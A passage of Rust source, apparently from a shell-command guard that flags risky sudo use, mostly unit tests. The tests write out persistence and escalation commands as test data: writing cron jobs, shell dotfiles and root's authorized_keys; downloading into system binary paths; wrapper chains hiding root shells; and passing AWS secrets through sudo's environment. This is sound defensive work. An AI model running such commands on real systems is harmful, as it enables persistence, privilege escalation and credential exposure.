    if path.contains('\0') {
        return Err(());
    }
    let (root, tail) = if let Some(tail) = path.strip_prefix("${HOME:-/root}/") {
        ("~", tail)
    } else if let Some(tail) = path.strip_prefix("${HOME}/") {
        ("~", tail)
    } else if let Some(tail) = path.strip_prefix("$HOME/") {
        ("~", tail)
    } else if let Some(tail) = path.strip_prefix("~/") {
        ("~", tail)
    } else if matches!(path, "~" | "$HOME" | "${HOME}" | "${HOME:-/root}") {
        return Ok(Some("~".to_string()));
    } else if let Some(tail) = path.strip_prefix('/') {
        ("/", tail)
    } else {
        return Ok(None);
    };

    let mut components: Vec<&str> = Vec::new();
    for component in tail.split('/') {
        match component {
            "" | "." => {}
            ".." => {
                if components.pop().is_none() {
                    return Err(());
                }
            }
            other => components.push(other),
        }
    }
    if components.is_empty() {
        return Ok(Some(root.to_string()));
    }
    let normalized = if root == "/" {
        format!("/{}", components.join("/"))
    } else {
        format!("~/{}", components.join("/"))
    };
    Ok(Some(normalized))
}

/// `true` for a home shell-init dotfile (`~/.bashrc`, `~/.zshrc`, … exact basenames only,
/// no `.bak` suffixes). Recognises both `~/` and `$HOME/` prefixes.
fn is_home_shell_init_dotfile(p: &str) -> bool {
    const PREFIXES: &[&str] = &["~/", "$HOME/", "${HOME}/", "${HOME:-/root}/"];
    const FILES: &[&str] = &[
        ".bashrc",
        ".zshrc",
        ".profile",
        ".bash_profile",
        ".zshenv",
        ".bash_login",
        ".zprofile",
    ];
    for prefix in PREFIXES {
        if let Some(tail) = p.strip_prefix(prefix) {
            return FILES.contains(&tail);
        }
    }
    false
}

/// Sensitive env-var names currently set in `std::env`, classified by the
/// central registry and sorted for deterministic evidence.
fn sensitive_env_active() -> Vec<String> {
    let mut active = std::env::vars_os()
        .filter_map(|(name, value)| {
            let name = name.to_string_lossy().into_owned();
            (!value.is_empty() && is_sensitive_env_value(&name, &value)).then_some(name)
        })
        .collect::<Vec<_>>();
    active.sort();
    active.dedup();
    active
}

fn is_sensitive_env_value(name: &str, value: &std::ffi::OsStr) -> bool {
    value
        .to_str()
        .map(|value| crate::sensitive_assets::is_sensitive_env_assignment(name, value))
        .unwrap_or_else(|| crate::sensitive_assets::is_registered_env_name(name))
}

fn make_finding(
    rule_id: RuleId,
    severity: Severity,
    title: String,
    description: String,
    input: &str,
    seg: &tokenize::Segment,
) -> Finding {
    let matched = crate::redact::redact_command_text(&seg.raw, &[]);
    let input = crate::redact::redact_command_text(input, &[]);
    Finding {
        rule_id,
        severity,
        title,
        description,
        evidence: vec![
            Evidence::CommandPattern {
                pattern: "sudo <escalation-gate>".to_string(),
                matched: matched.chars().take(200).collect(),
            },
            Evidence::Text {
                detail: format!("input: {}", input.chars().take(200).collect::<String>()),
            },
        ],
        human_view: Some(
            "Sudo guard — confirm with `tirith sudo --help` before re-running.".to_string(),
        ),
        agent_view: Some(format!("tirith refused: sudo gate. rule={rule_id:?}",)),
        mitre_id: None,
        custom_rule_id: None,
    }
}

fn strip_outer_quotes(s: &str) -> &str {
    let bytes = s.as_bytes();
    if bytes.len() >= 2
        && ((bytes[0] == b'"' && bytes[bytes.len() - 1] == b'"')
            || (bytes[0] == b'\'' && bytes[bytes.len() - 1] == b'\''))
    {
        &s[1..s.len() - 1]
    } else {
        s
    }
}

fn command_basename(cmd: &str, shell: ShellType) -> String {
    let unq = strip_outer_quotes(cmd);
    let basename = match shell {
        ShellType::PowerShell | ShellType::Cmd => unq.rsplit(['/', '\\']).next().unwrap_or(unq),
        _ => unq.rsplit('/').next().unwrap_or(unq),
    };
    let lower = basename.to_lowercase();
    lower
        .strip_suffix(".exe")
        .map(str::to_string)
        .unwrap_or(lower)
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::policy::Policy;

    #[test]
    fn sudo_sh_fires_shell_spawn() {
        let policy = Policy::default();
        let findings = check("sudo sh", ShellType::Posix, &policy);
        assert!(
            findings
                .iter()
                .any(|f| matches!(f.rule_id, RuleId::SudoShellSpawn)),
            "sudo sh must fire SudoShellSpawn: {findings:?}"
        );
    }

    #[test]
    fn sudo_bash_fires_shell_spawn() {
        let policy = Policy::default();
        let findings = check("sudo bash", ShellType::Posix, &policy);
        assert!(findings
            .iter()
            .any(|f| matches!(f.rule_id, RuleId::SudoShellSpawn)));
    }

    #[test]
    fn sudo_with_user_flag_then_shell_fires() {
        let policy = Policy::default();
        let findings = check("sudo -u root bash", ShellType::Posix, &policy);
        assert!(findings
            .iter()
            .any(|f| matches!(f.rule_id, RuleId::SudoShellSpawn)));
    }

    #[test]
    fn sudo_canonical_shell_modes_fire() {
        let policy = Policy::default();
        for command in [
            "sudo -s",
            "sudo -i",
            "sudo --shell",
            "sudo --login",
            "sudo --prompt password: --shell",
            "sudo --chroot /mnt --login",
            "sudo -Es",
        ] {
            let findings = check(command, ShellType::Posix, &policy);
            assert!(
                findings
                    .iter()
                    .any(|finding| matches!(finding.rule_id, RuleId::SudoShellSpawn)),
                "sudo shell mode escaped detection for {command:?}: {findings:?}"
            );
        }
    }

    #[test]
    fn sudo_apt_update_does_not_fire_shell_spawn() {
        let policy = Policy::default();
        let findings = check("sudo apt update", ShellType::Posix, &policy);
        assert!(findings.is_empty(), "{findings:?}");
    }

    #[test]
    fn sudo_tee_etc_cron_fires() {
        let policy = Policy::default();
        let findings = check("sudo tee /etc/cron.d/foo", ShellType::Posix, &policy);
        assert!(
            findings
                .iter()
                .any(|f| matches!(f.rule_id, RuleId::SudoTeeSystemFile)),
            "{findings:?}"
        );
    }

    #[test]
    fn sudo_tee_usr_local_bin_fires() {
        let policy = Policy::default();
        let findings = check("sudo tee /usr/local/bin/tool", ShellType::Posix, &policy);
        assert!(findings
            .iter()
            .any(|f| matches!(f.rule_id, RuleId::SudoTeeSystemFile)));
    }

    #[test]
    fn sudo_tee_tmp_does_not_fire() {
        let policy = Policy::default();
        let findings = check("sudo tee /tmp/foo", ShellType::Posix, &policy);
        assert!(
            findings.is_empty(),
            "sudo tee /tmp/foo must NOT fire: {findings:?}"
        );
    }

    #[test]
    fn sudo_tee_home_does_not_fire() {
        let policy = Policy::default();
        let findings = check("sudo tee ~/foo", ShellType::Posix, &policy);
        assert!(
            findings.is_empty(),
            "sudo tee ~/foo must NOT fire: {findings:?}"
        );
    }

    #[test]
    fn sudo_tee_home_dotfile_fires() {
        // Regression PR-127 #3: `sudo tee ~/.bashrc` (persistence vector) previously
        // bypassed every sudo rule AND dotfile_overwrite (which only matches the redirect).
        let policy = Policy::default();
        for path in [
            "~/.bashrc",
            "~/.zshrc",
            "~/.profile",
            "~/.bash_profile",
            "~/.zshenv",
            "$HOME/.bashrc",
            "${HOME}/.zshrc",
        ] {
            let cmd = format!("sudo tee {path}");
            let findings = check(&cmd, ShellType::Posix, &policy);
            assert!(
                findings
                    .iter()
                    .any(|f| matches!(f.rule_id, RuleId::SudoTeeSystemFile)),
                "expected SudoTeeSystemFile for `{cmd}`; got: {findings:?}"
            );
        }
    }

    #[test]
    fn sudo_tee_webroot_and_persistent_dirs_fire() {
        // Regression PR-127 #16: /var/www, /srv, /root, /boot, /var/lib were missing.
        let policy = Policy::default();
        for path in [
            "/var/www/html/x.php",
            "/srv/http/index.html",
            "/root/.ssh/authorized_keys",
            "/boot/grub.cfg",
            "/var/lib/dpkg/status",
        ] {
            let cmd = format!("sudo tee {path}");
            let findings = check(&cmd, ShellType::Posix, &policy);
            assert!(
                findings
                    .iter()
                    .any(|f| matches!(f.rule_id, RuleId::SudoTeeSystemFile)),
                "expected SudoTeeSystemFile for `{cmd}`; got: {findings:?}"
            );
        }
    }

    #[test]
    fn sudo_curl_o_usr_local_bin_fires() {
        let policy = Policy::default();
        let findings = check(
            "sudo curl -o /usr/local/bin/foo https://example.com/foo",
            ShellType::Posix,
            &policy,
        );
        assert!(
            findings
                .iter()
                .any(|f| matches!(f.rule_id, RuleId::SudoDownloadInstall)),
            "{findings:?}"
        );
    }

    #[test]
    fn later_tee_and_download_targets_cannot_hide_behind_safe_ones() {
        let policy = Policy::default();
        for command in [
            "sudo tee /tmp/preview /etc/cron.d/payload",
            "sudo curl -o /tmp/preview https://example.com/a -o /usr/local/bin/tool https://example.com/b",
            "sudo wget -O /tmp/preview https://example.com/a -O /etc/cron.d/payload https://example.com/b",
        ] {
            let findings = check(command, ShellType::Posix, &policy);
            assert!(
                findings.iter().any(|finding| matches!(
                    finding.rule_id,
                    RuleId::SudoTeeSystemFile | RuleId::SudoDownloadInstall
                )),
                "later privileged output escaped for {command:?}: {findings:?}"
            );
        }
    }

    #[test]
    fn sudo_curl_to_home_does_not_fire() {
        let policy = Policy::default();
        let findings = check(
            "sudo curl -o ~/foo https://example.com/foo",
            ShellType::Posix,
            &policy,
        );
        assert!(findings.is_empty(), "{findings:?}");
    }

    #[test]
    fn sudo_wget_glued_output_etc_fires() {
        let policy = Policy::default();
        let findings = check(
            "sudo wget --output-document=/etc/foo https://example.com/foo",
            ShellType::Posix,
            &policy,
        );
        assert!(findings
            .iter()
            .any(|f| matches!(f.rule_id, RuleId::SudoDownloadInstall)));
    }

    #[test]
    fn downloader_attached_output_forms_fire() {
        let policy = Policy::default();
        for command in [
            "sudo curl -o/usr/local/bin/tool https://example.com/tool",
            "sudo wget -O/etc/cron.d/payload https://example.com/payload",
            "sudo wget --output-document=/etc/cron.d/payload https://example.com/payload",
            "sudo wget --output-document /usr/local/sbin/tool https://example.com/tool",
        ] {
            let findings = check(command, ShellType::Posix, &policy);
            assert!(
                findings
                    .iter()
                    .any(|finding| matches!(finding.rule_id, RuleId::SudoDownloadInstall)),
                "downloader output spelling escaped detection for {command:?}: {findings:?}"
            );
        }
    }

    #[test]
    fn sudo_chmod_r_777_home_fires() {
        let policy = Policy::default();
        let findings = check("sudo chmod -R 777 /home", ShellType::Posix, &policy);
        assert!(
            findings
                .iter()
                .any(|f| matches!(f.rule_id, RuleId::SudoRecursivePermsBroadPath)),
            "{findings:?}"
        );
    }

    #[test]
    fn sudo_chmod_r_777_narrow_does_not_fire() {
        let policy = Policy::default();
        let findings = check("sudo chmod -R 777 /home/me/proj", ShellType::Posix, &policy);
        assert!(findings.is_empty(), "{findings:?}");
    }

    #[test]
    fn sudo_chown_r_root_etc_fires() {
        let policy = Policy::default();
        let findings = check("sudo chown -R root:root /etc", ShellType::Posix, &policy);
        assert!(findings
            .iter()
            .any(|f| matches!(f.rule_id, RuleId::SudoRecursivePermsBroadPath)));
    }

    #[test]
    fn sudo_chmod_without_recursive_does_not_fire() {
        let policy = Policy::default();
        let findings = check("sudo chmod 777 /home", ShellType::Posix, &policy);
        assert!(findings.is_empty(), "{findings:?}");
    }

    #[test]
    fn non_sudo_does_not_fire() {
        let policy = Policy::default();
        let findings = check("ls /etc", ShellType::Posix, &policy);
        assert!(findings.is_empty());
    }

    #[test]
    fn env_wrapped_sudo_sh_fires() {
        let policy = Policy::default();
        let findings = check("env FOO=bar sudo bash", ShellType::Posix, &policy);
        assert!(findings
            .iter()
            .any(|f| matches!(f.rule_id, RuleId::SudoShellSpawn)));
    }

    #[test]
    fn value_aware_and_recursive_wrappers_reach_sudo() {
        let policy = Policy::default();
        for command in [
            "env -u SUDO_ASKPASS sudo bash",
            "env --argv0 elevated sudo -s",
            "env -a elevated sudo -i",
            "env -- FOO=1 sudo -s",
            "command env --chdir /tmp time sudo -i",
            "time -af %e sudo -s",
            "time -f %e command -- sudo -s",
            r#"env -S "sudo -i""#,
            r#"env -S "sudo" -i"#,
            r#"env -S "-i FOO=1 sudo -i""#,
        ] {
            let findings = check(command, ShellType::Posix, &policy);
            assert!(
                findings
                    .iter()
                    .any(|finding| matches!(finding.rule_id, RuleId::SudoShellSpawn)),
                "wrapper chain hid sudo shell for {command:?}: {findings:?}"
            );
        }
    }

    #[test]
    fn wrapper_depth_boundaries_fail_closed_instead_of_disabling_sudo_analysis() {
        let policy = Policy::default();
        for depth in [31usize, 32, 33] {
            let command = format!(
                "{}sudo --preserve-env=AWS_SECRET_ACCESS_KEY sh",
                "command ".repeat(depth)
            );
            let findings = check(&command, ShellType::Posix, &policy);
            if depth == 31 {
                assert!(
                    findings
                        .iter()
                        .any(|finding| finding.rule_id == RuleId::SudoShellSpawn),
                    "last supported wrapper depth lost sudo: {findings:?}"
                );
                assert!(
                    findings
                        .iter()
                        .all(|finding| finding.rule_id != RuleId::AnalysisIncomplete),
                    "supported wrapper depth was marked incomplete: {findings:?}"
                );
            } else {
                assert!(
                    findings
                        .iter()
                        .any(|finding| finding.rule_id == RuleId::AnalysisIncomplete),
                    "exhausted wrapper depth was silently accepted: {findings:?}"
                );
            }
        }

        let benign = format!("{}printf safe", "command ".repeat(33));
        assert!(
            check(&benign, ShellType::Posix, &policy).is_empty(),
            "a non-sudo exhausted wrapper chain must not be mislabeled"
        );
    }

    #[test]
    fn active_sudo_session_cannot_downgrade_wrapper_analysis_exhaustion() {
        let policy = Policy::default();
        for depth in [31usize, 32, 33] {
            let command = format!("{}sudo sh", "command ".repeat(depth));
            let mut findings = check(&command, ShellType::Posix, &policy);
            apply_active_sudo_session_downgrade(&mut findings);

            if depth == 31 {
                let shell = findings
                    .iter()
                    .find(|finding| finding.rule_id == RuleId::SudoShellSpawn)
                    .expect("the last supported wrapper depth must still resolve sudo");
                assert_eq!(
                    shell.severity,
                    Severity::Medium,
                    "a tagged session may acknowledge a fully analyzed sudo hazard"
                );
            } else {
                let incomplete = findings
                    .iter()
                    .find(|finding| finding.rule_id == RuleId::AnalysisIncomplete)
                    .expect("wrapper exhaustion must remain explicit");
                assert_eq!(
                    incomplete.severity,
                    Severity::High,
                    "an active sudo session must not weaken fail-closed analysis exhaustion"
                );
            }
        }
    }

    #[test]
    fn preserve_env_named_aws_secret_fires() {
        // Uses the explicit `--preserve-env=AWS_SECRET_ACCESS_KEY` form (no env mutation,
        // so the libc-environ race is irrelevant).
        let policy = Policy::default();
        let findings = check(
            "sudo --preserve-env=AWS_SECRET_ACCESS_KEY pip install foo",
            ShellType::Posix,
            &policy,
        );
        assert!(
            findings
                .iter()
                .any(|f| matches!(f.rule_id, RuleId::SudoEnvPreserveSensitive)),
            "expected SudoEnvPreserveSensitive: {findings:?}"
        );
    }

    #[test]
    fn preserve_env_named_non_sensitive_does_not_fire() {
        let policy = Policy::default();
        let findings = check(
            "sudo --preserve-env=PATH,LANG pip install foo",
            ShellType::Posix,
            &policy,
        );
        // Neither PATH nor LANG is in the central sensitive-asset registry.
        assert!(
            !findings
                .iter()
                .any(|f| matches!(f.rule_id, RuleId::SudoEnvPreserveSensitive)),
            "PATH/LANG must NOT fire SudoEnvPreserveSensitive: {findings:?}"
        );
    }

    #[test]
    fn env_clear_unset_and_empty_scopes_mask_preserved_secrets() {
        let policy = Policy::default();
        for command in [
            "env -u AWS_SECRET_ACCESS_KEY sudo -E pip install foo",
            "env --unset=AWS_SECRET_ACCESS_KEY sudo -E pip install foo",
        ] {
            let segments = tokenize::tokenize(command, ShellType::Posix);
            let parsed = parse_sudo_invocation(&segments[0], ShellType::Posix)
                .unwrap_or_else(|| panic!("sudo wrapper did not resolve: {command}"));
            assert!(matches!(
                parsed.wrapper_env.get("AWS_SECRET_ACCESS_KEY"),
                Some(ScopedEnvValue::Unset)
            ));
        }
        let clear_segments = tokenize::tokenize("env -i sudo -E pip install foo", ShellType::Posix);
        assert!(parse_sudo_invocation(&clear_segments[0], ShellType::Posix)
            .is_some_and(|parsed| parsed.clear_ambient));

        let empty_segments = tokenize::tokenize(
            "AWS_SECRET_ACCESS_KEY='' sudo -E pip install foo",
            ShellType::Posix,
        );
        let empty = parse_sudo_invocation(&empty_segments[0], ShellType::Posix)
            .expect("empty scoped sudo assignment");
        assert!(matches!(
            empty.wrapper_env.get("AWS_SECRET_ACCESS_KEY"),
            Some(ScopedEnvValue::Set(value)) if value.is_empty()
        ));

        for command in [
            "env -i sudo -E pip install foo",
            "env --ignore-environment sudo -E pip install foo",
            "env -i env -u AWS_SECRET_ACCESS_KEY sudo -E pip install foo",
            "AWS_SECRET_ACCESS_KEY=outer env -i sudo -E pip install foo",
            "env -i env AWS_SECRET_ACCESS_KEY= sudo -E pip install foo",
            "AWS_SECRET_ACCESS_KEY='' sudo --preserve-env=AWS_SECRET_ACCESS_KEY pip install foo",
            "AWS_SECRET_ACCESS_KEY=outer AWS_SECRET_ACCESS_KEY= sudo --preserve-env=AWS_SECRET_ACCESS_KEY pip install foo",
        ] {
            let findings = check(command, ShellType::Posix, &policy);
            assert!(
                !findings
                    .iter()
                    .any(|finding| finding.rule_id == RuleId::SudoEnvPreserveSensitive),
                "cleared, unset, or empty scoped value must mask a secret for {command:?}: {findings:?}"
            );
        }
    }

    #[test]
    fn preserve_env_uses_exact_posix_identity_for_aws_secret_prefixes() {
        let policy = Policy::default();
        for command in [
            "AWS_SECRET_CUSTOM=hunter2 awsSecretCustom='' sudo --preserve-env=AWS_SECRET_CUSTOM pip install foo",
            "awsSecretCustom='' AWS_SECRET_CUSTOM=hunter2 sudo --preserve-env=AWS_SECRET_CUSTOM pip install foo",
            "AWS_SECRET_CUSTOM=hunter2 env -u awsSecretCustom sudo --preserve-env=AWS_SECRET_CUSTOM pip install foo",
            "AWS_SECRET_CUSTOM=hunter2 env -u awsSecretCustom sudo -E pip install foo",
        ] {
            let findings = check(command, ShellType::Posix, &policy);
            assert!(
                findings
                    .iter()
                    .any(|finding| finding.rule_id == RuleId::SudoEnvPreserveSensitive),
                "an empty or unset alias must not overwrite the exact preserved AWS name for {command:?}: {findings:?}"
            );
        }

        for command in [
            "awsSecretCustom=hunter2 AWS_SECRET_CUSTOM='' sudo --preserve-env=AWS_SECRET_CUSTOM pip install foo",
            "AWS_SECRET_CUSTOM='' awsSecretCustom=hunter2 sudo --preserve-env=AWS_SECRET_CUSTOM pip install foo",
            "awsSecretCustom=hunter2 env -u AWS_SECRET_CUSTOM sudo --preserve-env=AWS_SECRET_CUSTOM pip install foo",
            "awsSecretCustom=hunter2 env -u AWS_SECRET_CUSTOM sudo -E pip install foo",
        ] {
            let findings = check(command, ShellType::Posix, &policy);
            assert!(
                !findings
                    .iter()
                    .any(|finding| finding.rule_id == RuleId::SudoEnvPreserveSensitive),
                "a non-exact alias must not satisfy an empty or unset preserved AWS name for {command:?}: {findings:?}"
            );
        }
    }

    #[test]
    fn leading_env_duplicates_use_last_assignment_and_env_null_does_not_clear() {
        let policy = Policy::default();
        for command in [
            "AWS_SECRET_ACCESS_KEY= AWS_SECRET_ACCESS_KEY=hunter2 sudo -E pip install foo",
            "awsSecretAccessKey= AWS_SECRET_ACCESS_KEY=hunter2 sudo -E pip install foo",
            "AWS_SECRET_ACCESS_KEY=hunter2 env -0 sudo -E pip install foo",
        ] {
            let findings = check(command, ShellType::Posix, &policy);
            assert!(
                findings
                    .iter()
                    .any(|finding| finding.rule_id == RuleId::SudoEnvPreserveSensitive),
                "nearest non-empty secret must remain active for {command:?}: {findings:?}"
            );
        }
    }

    #[test]
    fn preserve_env_uses_kind_aware_exact_and_prefix_registry() {
        let policy = Policy::default();
        let public_rpc = check(
            "sudo --preserve-env=RPC_URL pip install foo",
            ShellType::Posix,
            &policy,
        );
        assert!(!public_rpc
            .iter()
            .any(|finding| finding.rule_id == RuleId::SudoEnvPreserveSensitive));

        for name in ["RPC_API_KEY", "AWS_SECRET_C04"] {
            let findings = check(
                &format!("sudo --preserve-env={name} pip install foo"),
                ShellType::Posix,
                &policy,
            );
            assert!(findings
                .iter()
                .any(|finding| finding.rule_id == RuleId::SudoEnvPreserveSensitive));
        }

        assert!(!is_sensitive_env_value(
            "RPC_URL",
            std::ffi::OsStr::new("https://rpc.example/rpc")
        ));
        assert!(is_sensitive_env_value(
            "RPC_URL",
            std::ffi::OsStr::new("https://rpc.example/v3/providerToken123456789")
        ));

        let scoped_secret = "providerToken123456789";
        for command in [
            format!(
                "env RPC_URL=https://rpc.example/v3/{scoped_secret} sudo --preserve-env=RPC_URL pip install foo"
            ),
            format!("env RPC_URL=https://rpc.example/v3/{scoped_secret} sudo -E pip install foo"),
            format!("RPC_URL=https://rpc.example/v3/{scoped_secret} sudo -E pip install foo"),
            format!(
                r#"env -S "RPC_URL=https://rpc.example/v3/{scoped_secret} sudo -E pip install foo""#
            ),
            format!(
                r#"env --split-string='rpcUrl=https://rpc.example/v3/{scoped_secret} sudo -E pip install foo'"#
            ),
            format!("sudo -E AWS_SECRET_ACCESS_KEY={scoped_secret} pip install foo"),
            format!(
                "sudo -E -- rpcUrl=https://rpc.example/v3/{scoped_secret} pip install foo"
            ),
        ] {
            let findings = check(&command, ShellType::Posix, &policy);
            let finding = findings
                .iter()
                .find(|finding| finding.rule_id == RuleId::SudoEnvPreserveSensitive)
                .unwrap_or_else(|| panic!("missing RPC preserve finding: {findings:?}"));
            let serialized = serde_json::to_string(finding).unwrap();
            assert!(!serialized.contains(scoped_secret), "{serialized}");
            assert!(!serialized.contains("rpc.example/v3"), "{serialized}");
        }

        let scoped_public = check(
            "env RPC_URL=https://rpc.example/rpc sudo --preserve-env=RPC_URL pip install foo",
            ShellType::Posix,
            &policy,
        );
        assert!(!scoped_public
            .iter()
            .any(|finding| finding.rule_id == RuleId::SudoEnvPreserveSensitive));

        let public_with_comment = check(
            "RPC_URL=https://rpc.example/rpc sudo --preserve-env=RPC_URL pip install foo # providerToken123456789",
            ShellType::Posix,
            &policy,
        );
        assert!(!public_with_comment
            .iter()
            .any(|finding| finding.rule_id == RuleId::SudoEnvPreserveSensitive));

        let exact_public = check(
            &format!(
                "rpcUrl=https://rpc.example/v3/{scoped_secret} env RPC_URL=https://rpc.example/rpc sudo --preserve-env=RPC_URL pip install foo"
            ),
            ShellType::Posix,
            &policy,
        );
        assert!(!exact_public
            .iter()
            .any(|finding| finding.rule_id == RuleId::SudoEnvPreserveSensitive));
    }

    #[test]
    fn preserve_env_uses_exact_posix_identity_for_rpc_aliases() {
        let policy = Policy::default();
        let scoped_secret = "providerToken123456789";
        let public = "https://rpc.example/rpc";

        for command in [
            format!(
                "RPC_URL=https://rpc.example/v3/{scoped_secret} rpcUrl={public} sudo --preserve-env=RPC_URL pip install foo"
            ),
            format!(
                "rpcUrl={public} RPC_URL=https://rpc.example/v3/{scoped_secret} sudo --preserve-env=RPC_URL pip install foo"
            ),
            format!(
                r#"env RPC_URL=https://rpc.example/v3/{scoped_secret} -S "rpcUrl={public} sudo --preserve-env=RPC_URL pip install foo""#
            ),
            format!(
                "RPC_URL={public} rpcUrl=https://rpc.example/v3/{scoped_secret} sudo --preserve-env=rpcUrl pip install foo"
            ),
            format!(
                "RPC_URL=https://rpc.example/v3/{scoped_secret} env -u rpcUrl sudo -E pip install foo"
            ),
            format!(
                "rpcUrl=https://rpc.example/v3/{scoped_secret} env -u RPC_URL sudo -E pip install foo"
            ),
        ] {
            let findings = check(&command, ShellType::Posix, &policy);
            let finding = findings
                .iter()
                .find(|finding| finding.rule_id == RuleId::SudoEnvPreserveSensitive)
                .unwrap_or_else(|| {
                    panic!(
                        "a benign alias must not overwrite the exact preserved RPC name: {findings:?}"
                    )
                });
            let serialized = serde_json::to_string(finding).unwrap();
            assert!(!serialized.contains(scoped_secret), "{serialized}");
        }

        for command in [
            format!(
                "rpcUrl=https://rpc.example/v3/{scoped_secret} RPC_URL={public} sudo --preserve-env=RPC_URL pip install foo"
            ),
            format!(
                "RPC_URL={public} rpcUrl=https://rpc.example/v3/{scoped_secret} sudo --preserve-env=RPC_URL pip install foo"
            ),
            format!(
                "rpcUrl=https://rpc.example/v3/{scoped_secret} env -u RPC_URL sudo --preserve-env=RPC_URL pip install foo"
            ),
            format!(
                "RPC_URL=https://rpc.example/v3/{scoped_secret} rpcUrl={public} sudo --preserve-env=rpcUrl pip install foo"
            ),
        ] {
            let findings = check(&command, ShellType::Posix, &policy);
            assert!(
                !findings
                    .iter()
                    .any(|finding| finding.rule_id == RuleId::SudoEnvPreserveSensitive),
                "a secret alias must not satisfy the exact benign or unset preserved RPC name for {command:?}: {findings:?}"
            );
        }
    }

    #[test]
    fn is_protected_system_path_recognises_etc_cron_d() {
        assert!(is_protected_system_path("/etc/cron.d/foo"));
        assert!(is_protected_system_path("/etc/cron.daily/foo"));
        assert!(is_protected_system_path("/etc/systemd/system/x.service"));
        assert!(is_protected_system_path("/lib/systemd/system/x.service"));
        assert!(is_protected_system_path("/usr/local/bin/tool"));
        assert!(!is_protected_system_path("/tmp/foo"));
        assert!(!is_protected_system_path("/home/me/foo"));
        assert!(!is_protected_system_path("relative/path"));
        // ~/foo (non-dotfile, non-shell-init) is still allowed.
        assert!(!is_protected_system_path("~/foo"));
    }

    #[test]
    fn protected_paths_are_lexically_normalized() {
        for path in [
            "/var/../etc/cron.d/payload",
            "/etc//cron.d/./payload",
            "/usr/local/bin/../sbin/tool",
            "/var/spool/cron/root",
            "/sbin/tool",
            "~/.config/../.bashrc",
        ] {
            assert!(
                is_protected_system_path(path),
                "normalized protected path was missed: {path}"
            );
        }
        assert!(!is_protected_system_path("/var/tmp/../tmp/file"));
        assert!(is_protected_system_path("/../../etc/passwd"));
    }

    #[test]
    fn is_protected_system_path_covers_home_shell_init_dotfiles() {
        // Regression PR-127 #3: `sudo tee ~/.bashrc` was silently allowed.
        assert!(is_protected_system_path("~/.bashrc"));
        assert!(is_protected_system_path("~/.zshrc"));
        assert!(is_protected_system_path("~/.profile"));
        assert!(is_protected_system_path("~/.bash_profile"));
        assert!(is_protected_system_path("~/.zshenv"));
        assert!(is_protected_system_path("~/.bash_login"));
        assert!(is_protected_system_path("~/.zprofile"));
        assert!(is_protected_system_path("$HOME/.bashrc"));
        assert!(is_protected_system_path("${HOME}/.zshrc"));
        // Suffixes / non-shell-init dotfiles remain allowed.
        assert!(!is_protected_system_path("~/.bashrc.bak"));
        assert!(!is_protected_system_path("~/.config/some.toml"));
        assert!(!is_protected_system_path("~/.vimrc"));
    }

    #[test]
    fn is_protected_system_path_covers_webroot_and_persistent_dirs() {
        // Regression PR-127 #16: /var/www, /srv, /root, /boot, /var/lib were missing.
        assert!(is_protected_system_path("/var/www"));
        assert!(is_protected_system_path("/var/www/html/x.php"));
        assert!(is_protected_system_path("/srv/http/index.html"));
        assert!(is_protected_system_path("/root"));
        assert!(is_protected_system_path("/root/.ssh/authorized_keys"));
        assert!(is_protected_system_path("/boot/grub.cfg"));
        assert!(is_protected_system_path("/var/lib/dpkg/status"));
    }

    #[test]
    fn is_broad_path_strict_set() {
        assert!(is_broad_path("/"));
        assert!(is_broad_path("/home"));
        assert!(is_broad_path("/etc"));
        assert!(is_broad_path("/usr"));
        // PR-127 review #13 expansion.
        assert!(is_broad_path("/var"));
        assert!(is_broad_path("/opt"));
        assert!(is_broad_path("/srv"));
        assert!(is_broad_path("/lib"));
        assert!(is_broad_path("/bin"));
        assert!(is_broad_path("/usr/../etc"));
        assert!(is_broad_path("/usr//local/../local/sbin"));
        assert!(is_broad_path("/var/spool/cron"));
        assert!(!is_broad_path("/etc/cron.d"));
        assert!(!is_broad_path("/home/me"));
    }

    #[test]
    fn download_output_paths_reads_clustered_short_options() {
        // The spelling install scripts actually use: the destination option
        // clustered behind other short flags.
        assert_eq!(
            download_output_paths(
                "curl",
                &[
                    "-fsSLo".to_string(),
                    "/usr/local/bin/kubectl".to_string(),
                    "https://example.com/k".to_string(),
                ]
            ),
            vec!["/usr/local/bin/kubectl"],
        );
        assert_eq!(
            download_output_paths(
                "wget",
                &[
                    "-qO".to_string(),
                    "/etc/cron.d/payload".to_string(),
                    "https://example.com/p".to_string(),
                ]
            ),
            vec!["/etc/cron.d/payload"],
        );
    }

    #[test]
    fn download_output_paths_split_glued_and_repeated() {
        assert_eq!(
            download_output_paths(
                "curl",
                &[
                    "-o".to_string(),
                    "/usr/local/bin/foo".to_string(),
                    "https://example.com/foo".to_string(),
                ]
            ),
            vec!["/usr/local/bin/foo"],
        );
        assert_eq!(
            download_output_paths(
                "curl",
                &[
                    "--output=/etc/x".to_string(),
                    "https://example.com/x".to_string(),
                ]
            ),
            vec!["/etc/x"],
        );
        assert_eq!(
            download_output_paths(
                "wget",
                &["-O".to_string(), "/usr/local/bin/foo".to_string()],
            ),
            vec!["/usr/local/bin/foo"],
        );
        assert_eq!(
            download_output_paths("wget", &["--output-document=/etc/x".to_string()],),
            vec!["/etc/x"],
        );
    }
}
